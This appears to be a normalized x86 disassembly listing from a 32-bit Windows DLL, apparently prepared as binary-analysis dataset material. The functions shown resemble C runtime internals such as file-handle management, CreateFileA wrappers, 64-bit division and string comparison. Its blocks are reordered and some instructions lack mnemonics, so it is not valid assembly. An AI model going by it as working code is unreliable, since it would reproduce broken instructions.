or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_1000f270
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_1000f2a8
inc [ rw-data ]
push 0x1000
call sub_10008cba
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_1000f2ec
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_1000f315
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000f36e
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_1000b7a4
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_1000b805
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000f36e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_1000a5cf
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_1000f3e0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1000f450
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1000f4c5
push ecx
push ecx
push ebx
push ebp
push esi
push edi
push 0x12
or edi 0xffffffff
call sub_1000b7a4
xor ebx ebx
pop ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov ebp rw-data
mov esi 0x480
push esi
call sub_10008cba
test eax eax
pop ecx
je r-xdata
lea eax [ esi + 0x480 ]
push 0x12
call sub_1000b805
pop ecx
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
add [ rw-data ] 0x20
lea ecx [ ebx * 4 + rw-data ]
lea edx [ eax + 0x480 ]
mov [ ecx ] eax
add [ esp + 0x14 ] 0x20
add ebp 0x4
inc ebx
cmp ebp rw-data
mov [ esp + 0x10 ] ebx
jl r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl ebx 0x5
mov edi ebx
push edi
call sub_1000f725
pop ecx
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x24
add edx esi
jmp r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp ]
add esi 0x24
add eax 0x480
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp eax edx
jae r-xdata
cmp esi eax
jae r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
push 0x11
call sub_1000b7a4
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
or [ esi ] 0xffffffff
mov eax esi
sub eax [ ebp ]
push 0x24
pop ecx
cdq
idiv ecx
mov edi eax
add edi [ esp + 0x14 ]
cmp edi 0xffffffff
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x10 ]
push 0x11
call sub_1000b805
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov ebx [ esp + 0x10 ]
sub_1000f5e8
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
call sub_1000a5d8
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
cmp [ eax + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1000f664
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
call sub_1000a5d8
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_1000f6e3
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
call sub_1000a5d8
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_1000f725
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_1000b7a4
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_1000b805
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_1000f7a6
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_1000f725
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_1000f6e3
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_1000f784
pop ecx
mov eax esi
jmp r-xdata
call sub_1000a5d8
mov [ eax ] esi
test esi esi
je r-xdata
sub_1000f839
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
jne r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
call sub_1000a5cf
mov [ eax ] 0x16
call sub_1000a5d8
mov [ eax ] ebx
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_1000f4c5
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi __dos_header
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
call sub_1000a5cf
mov [ eax ] 0x18
call sub_1000a5d8
and [ eax ] 0x0
mov eax edi
jmp r-xdata
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_1000a55c
pop ecx
mov esi edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
call sub_1000f784
pop ecx
mov eax esi
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_1000f5e8
mov eax ebx
pop ecx
sar eax 0x5
pop ecx
mov cl [ ebp - 0x1 ]
lea edi [ eax * 4 + rw-data ]
mov eax ebx
or cl 0x1
and eax 0x1f
mov [ ebp + 0xb ] cl
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
and [ ebp + 0xb ] 0x48
mov [ eax + esi + 0x4 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test cl 0x80
je r-xdata
mov esi ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_1000caf1
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_1000c671
add esp 0xc
test eax eax
jne r-xdata
call sub_1000a5d8
cmp [ eax ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_1000caf1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
push ebx
call sub_1000c84a
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebp - 0x10 ]
push ebx
call sub_1000ffaa
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_1000fb08
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_1000fb91
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_1000e840
pop ecx
mov edi eax
call sub_1001010e
test eax eax
jne r-xdata
push eax
call sub_1000e840
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_100100cf
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_1000fc0e
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_1000f110
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_1000b4c0
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_1000fcd9
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_1000b211
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_1000fe5b
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
push ebx
call sub_1000b805
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_1000a830
push 0x1
call sub_1000b805
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_1000b805
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_1000b7a4
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_1000fe5b
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx + 0x4 ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_1000fea0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_1000b7a4
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_1000fc0e
mov ebx eax
add esp 0x4
call sub_1000fc0e
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_1000b805
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_1000ffaa
push ebp
mov ebp esp
mov eax 0x1004
call sub_10007d40
push ebx
push esi
xor esi esi
push 0x1
push esi
push [ ebp + 0x8 ]
call sub_1000caf1
or ebx 0xffffffff
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax ebx
push 0x2
push esi
push [ ebp + 0x8 ]
call sub_1000caf1
add esp 0xc
cmp eax ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
mov ebx 0x1000
lea eax [ ebp - 0x1004 ]
push ebx
push esi
push eax
call sub_10009030
push 0x8000
push [ ebp + 0x8 ]
call sub_1001017c
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_1000caf1
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000caf1
push [ ebp + 0x8 ]
call sub_1000f6e3
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi ebx
jne r-xdata
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp + 0x8 ]
call sub_1000cf62
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
call sub_1000a5cf
mov [ eax ] 0xd
call [ GetLastError@IAT ]
mov edi eax
call sub_1000a5d8
mov [ eax ] edi
call sub_1000a5d8
cmp [ eax ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
call sub_1000a5cf
mov [ eax ] 0xd
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001017c
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
cmp edi ebx
mov eax ebx
jge r-xdata
sub_100100cf
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_100101dd
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_1001010e
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_10008cba
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_1001045a
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_1001017c
mov eax [ esp + 0x4 ]
push esi
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov esi 0x8000
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 4 + 0x4 ]
mov cl [ ecx + eax * 4 + 0x4 ]
mov al cl
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
call sub_1000a5cf
mov [ eax ] 0x16
or eax 0xffffffff
pop esi
retn
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
sub_100101dd
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_1000b6e4
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_1000b6e4
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
